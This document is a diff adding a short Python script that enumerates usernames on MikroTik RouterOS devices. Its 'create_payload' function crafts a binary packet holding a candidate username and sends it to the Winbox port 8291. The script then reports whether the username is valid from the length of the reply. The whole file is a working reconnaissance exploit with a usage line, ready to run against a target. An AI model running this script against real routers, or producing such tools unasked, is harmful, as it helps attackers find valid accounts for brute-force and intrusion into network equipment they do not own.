@@ -1,0 +1,51 @@
+import sys
+import struct
+import socket
+
+def create_payload(base_payload, username):
+    length = len(username)
+    first_byte = struct.pack("B", 0x22 + length)  # Increment the first byte dynamically
+    return first_byte + base_payload[1:2] + username.encode() + base_payload[2:]
+
+
+def send_request(payload,target,port):
+
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        
+        s.settimeout(5)  # Timeout after 5 seconds
+        
+        s.connect((target, port))
+        
+        s.sendall(payload)
+        banner = s.recv(1024)
+        if len(banner)==51:
+            print("Valid Username!")
+        elif len(banner)==35:
+            print("Invalid username!")
+        else:
+            print("unknown")
+        
+        s.close()
+        
+    except Exception as e:
+        print("Error:", e)
+
+if __name__ == "__main__":
+    base_payload = b"\x22\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+
+
+    if len(sys.argv) < 3:
+        print("Usage: python mikrotik_routeros_userenum.py <username> <target>")
+        sys.exit(1)
+
+    username = sys.argv[1]
+    target = sys.argv[2]
+    port = 8291
+
+    payload=create_payload(base_payload,username)
+    send_request(payload,target,port)
+
+
+
+
